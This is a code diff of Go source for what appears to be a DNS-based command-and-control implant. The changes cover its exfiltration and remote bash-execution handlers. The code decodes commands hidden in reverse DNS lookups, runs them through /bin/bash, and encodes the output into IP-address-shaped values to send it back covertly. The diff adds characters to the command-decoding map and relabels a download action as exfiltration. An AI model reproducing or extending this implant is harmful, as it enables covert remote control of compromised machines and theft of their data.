@@ -24,12 +24,12 @@ func resolveCommand(host []string, bl *int) {
 
 		sections := strings.Split(host[0], ".")
 
-		// Action type (exfil, ls, etc.)
+		// Action type (exfil, bash command, etc.)
 		action_type := strings.Split(sections[0], "-")[1]
 
 		switch action_type {
 
-		// Download command has been received
+		// Exfiltration command has been received
 		case trigger_mappings["exf"]:
 			// Destination type (filename or filepath; "single" or "path")
 			dest_type := strings.Split(sections[0], "-")[2]
@@ -49,32 +49,30 @@ func resolveCommand(host []string, bl *int) {
 
 		// List directory command has been received
 		case trigger_mappings["bash"]:
-			replacement_mappings := map[string]string{"79": ".", "78": "|", "77": ";", "76": "'", "75": ">"}
+			replacement_mappings := map[string]string{"80": "..", "79": ".", "78": "|", "77": ";", "76": "'", "75": ">", "74": "/"}
 
 			// https://www.sohamkamani.com/golang/exec-shell-command/
 			var mode string = "c2"
 			command := strings.Split(sections[0], "-")[2]
-			args := sections[1:]
-			bash_command := strings.Join(args, "")
-
-			if len(args) > 0 {
+			bash_command := command
+			if len(sections[1:]) > 1 {
+				args := sections[1:]
+				bash_command = strings.Join(args, "")
 				indiv_args := strings.Split(bash_command, "-")
 				bash_command = strings.Join(indiv_args, " ")
-				bash_command = strings.Replace(bash_command, "_", "/", -1)
 
 				for k, v := range replacement_mappings {
 					if strings.Contains(bash_command, k) {
 						bash_command = strings.Replace(bash_command, k, v, -1)
 					}
 				}
-
 				bash_command = fmt.Sprintf("%v %v", command, bash_command)
-			}
 
+			}
 			cmd := exec.Command("/bin/bash", "-c", bash_command)
 			out, err := cmd.Output()
 			if err != nil {
-				fmt.Printf("Error: %v\n", err)
+				fmt.Println(err)
 			}
 			output_bytes := append([]byte("beg"), out...)
 			begin_comm(&output_bytes, bl, &mode)
@@ -96,7 +94,10 @@ func resolveAddr(address string, bl *int) {
 			return d.DialContext(ctx, network, "127.0.0.1:8053")
 		},
 	}
-	host, _ := r.LookupAddr(context.Background(), address)
+	host, err := r.LookupAddr(context.Background(), address)
+	if err != nil {
+		fmt.Println(err)
+	}
 	if len(host) > 0 {
 		resolveCommand(host, bl)
 	}
@@ -191,8 +192,8 @@ func add_padding(dat *[]byte) {
 func begin_comm(dat *[]byte, bp *int, mode *string) {
 	// Set the baseline for the exchange; the list of bytes can be blank for this operation.
 	send_data(true, []byte{}, bp, mode)
-
 	add_padding(dat)
+
 	// For each three bytes, send them to be sent encoded into an 'IP address'.
 	var prior int = 0
 	for index := 0; index < len(*dat); index++ {
